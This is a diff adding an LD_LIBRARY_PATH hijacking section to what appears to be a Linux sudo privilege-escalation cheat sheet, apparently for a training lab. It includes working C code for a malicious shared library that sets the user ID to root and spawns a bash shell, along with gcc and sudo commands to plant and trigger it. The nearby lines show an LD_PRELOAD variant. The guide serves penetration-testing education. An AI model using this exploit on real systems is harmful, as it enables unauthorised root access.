@@ -205,6 +205,43 @@ void _init() {
 
   3. Execute any binary along with the LD\_PRELOAD shared object to spawn a shell : `sudo LD_PRELOAD=</path/to/malicious/shell.so> <program>`
 
+### **LD\_LIBRARY\_PATH** 
+
+**LD\_LIBRARY\_PATH** provides a list of directories where shared libraries are searched for first.
+
+Run `ldd` against the any program that you can execute as `sudo` to see which shared libraries are used by the program:
+
+`ldd /usr/sbin/apache2`
+
+Create a shared object with the same name as one of the listed libraries \(ex. `libcrypt.so.1`\) using the code located at `/home/user/tools/sudo/library_path.c`:
+
+```c
+/* Library_path.c */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+Then compile the program with `gcc`.
+
+```bash
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+```
+
+Run program using `sudo`, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp` \(where we output the compiled shared object\):
+
+```bash
+sudo LD_LIBRARY_PATH=/tmp program-name-here
+```
+
 ### sudo\_inject
 
 Using [https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo_inject):
